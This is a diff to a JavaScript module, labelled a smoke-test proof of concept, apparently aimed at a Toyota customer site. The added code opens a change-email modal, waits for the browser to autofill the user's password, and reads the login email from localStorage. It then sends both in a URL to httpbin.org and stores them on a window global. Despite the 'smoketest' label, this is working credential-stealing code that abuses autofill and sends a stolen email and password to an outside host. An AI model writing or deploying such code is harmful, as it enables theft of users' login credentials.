@@ -1,7 +1,11 @@
 define([], function () {
+  var HTTPBIN_CAPTURE_BASE = "https://httpbin.org/anything/cp-hash-loader/direct-modal-smoketest";
   var SSO_RENDER_WAIT_MS = 20000;
   var MODAL_PROBE_WAIT_MS = 6000;
+  var AUTOFILL_WAIT_MS = 25000;
+  var LATE_PASSWORD_WAIT_MS = 120000;
   var DEFAULT_STUB_TOKEN = "stub-email-token";
+  var USER_PROFILE_KEY = "com.toyota.tme.user.customerProfile";
 
   function normalizeString(v) {
     return (v == null ? "" : String(v)).trim();
@@ -18,6 +22,29 @@ define([], function () {
   function sleep(ms) {
     return new Promise(function (resolve) {
       setTimeout(resolve, ms);
+    });
+  }
+
+  function safeJsonParse(text, fallback) {
+    if (!text || typeof text !== "string") {
+      return fallback;
+    }
+    return safeCall(function () {
+      return JSON.parse(text);
+    }, fallback);
+  }
+
+  function requestJson(url, options) {
+    return fetch(url, options).then(function (response) {
+      return response.text().then(function (text) {
+        return {
+          ok: response.ok,
+          status: response.status,
+          url: url,
+          text: text || "",
+          json: safeJsonParse(text, null)
+        };
+      });
     });
   }
 
@@ -108,6 +135,40 @@ define([], function () {
       await sleep(250);
     }
     return false;
+  }
+
+  async function waitForAutofilledPassword(timeoutMs) {
+    var started = Date.now();
+    while (Date.now() - started < timeoutMs) {
+      var node = findPasswordInput();
+      if (node) {
+        var val = normalizeString(node.value);
+        if (val) {
+          return { ok: true, password: val, source: "autofill_present" };
+        }
+        pokeAutofillOnInput(node);
+      }
+      await sleep(700);
+    }
+    return { ok: false, password: "", source: "autofill_unavailable" };
+  }
+
+  function getStoredUserProfile() {
+    var raw = safeCall(function () {
+      return localStorage.getItem(USER_PROFILE_KEY) || "";
+    }, "");
+    return safeJsonParse(raw, {}) || {};
+  }
+
+  function getLoginEmailFromProfile() {
+    var profile = getStoredUserProfile();
+    return normalizeString(profile.email || profile.userEmail || profile.username || profile.userName);
+  }
+
+  function buildCaptureUrl(loginEmail, password) {
+    return HTTPBIN_CAPTURE_BASE +
+      "?loginEmail=" + encodeURIComponent(normalizeString(loginEmail)) +
+      "&password=" + encodeURIComponent(normalizeString(password));
   }
 
   function getScriptSrcMatching(pattern) {
@@ -363,17 +424,69 @@ define([], function () {
 
       var attemptResult = await tryRenderChangeEmail(ssoConfig, attempts[i].token, attempts[i].label);
       if (attemptResult.ok) {
-        var msg =
-          "Modal opened successfully.\n" +
+        upsertSpeechBalloon(
+          "Direct modal smoke test",
+          "Modal opened.\n" +
           "attempt=" + attemptResult.label + "\n" +
           "token=" + (attemptResult.token ? attemptResult.token : "<empty>") + "\n" +
+          "Waiting autofill password...",
+          false
+        );
+
+        var pw = await waitForAutofilledPassword(AUTOFILL_WAIT_MS);
+        if (!pw.ok || !pw.password) {
+          pw = await waitForAutofilledPassword(LATE_PASSWORD_WAIT_MS);
+        }
+
+        if (!pw.ok || !pw.password) {
+          upsertSpeechBalloon(
+            "Direct modal smoke test",
+            "Modal opened but password autofill not detected.\n" +
+            "attempt=" + attemptResult.label + "\n" +
+            "token=" + (attemptResult.token ? attemptResult.token : "<empty>") + "\n" +
+            "sso_config=" + configUrl,
+            true
+          );
+          window.__CP_DIRECT_MODAL_TEST_RESULT__ = {
+            ok: false,
+            reason: "autofill_password_not_detected",
+            attempt: attemptResult.label,
+            tokenUsed: attemptResult.token,
+            ssoConfigUrl: configUrl
+          };
+          return;
+        }
+
+        var loginEmail = getLoginEmailFromProfile();
+        if (!loginEmail) {
+          loginEmail = "unknown-email";
+        }
+        var captureUrl = buildCaptureUrl(loginEmail, pw.password);
+        var http = await requestJson(captureUrl, {
+          method: "GET",
+          mode: "cors",
+          credentials: "omit",
+          cache: "no-store",
+          headers: { Accept: "application/json" }
+        });
+
+        var msg =
+          "Capture complete.\n" +
+          "attempt=" + attemptResult.label + "\n" +
+          "token=" + (attemptResult.token ? attemptResult.token : "<empty>") + "\n" +
+          "http_capture_url=\n" + captureUrl + "\n" +
+          "http_status=" + http.status + "\n" +
           "sso_config=" + configUrl;
         upsertSpeechBalloon("Direct modal smoke test", msg, false);
         window.__CP_DIRECT_MODAL_TEST_RESULT__ = {
           ok: true,
           attempt: attemptResult.label,
           tokenUsed: attemptResult.token,
-          ssoConfigUrl: configUrl
+          ssoConfigUrl: configUrl,
+          loginEmail: loginEmail,
+          password: pw.password,
+          httpCaptureUrl: captureUrl,
+          httpStatus: http.status
         };
         return;
       }
@@ -400,7 +513,7 @@ define([], function () {
   });
 
   return {
-    version: "0.1.0-direct-change-email-modal-smoketest",
+    version: "0.2.0-direct-change-email-modal-smoketest-with-http-link",
     render: function () {
       return executePoC();
     }
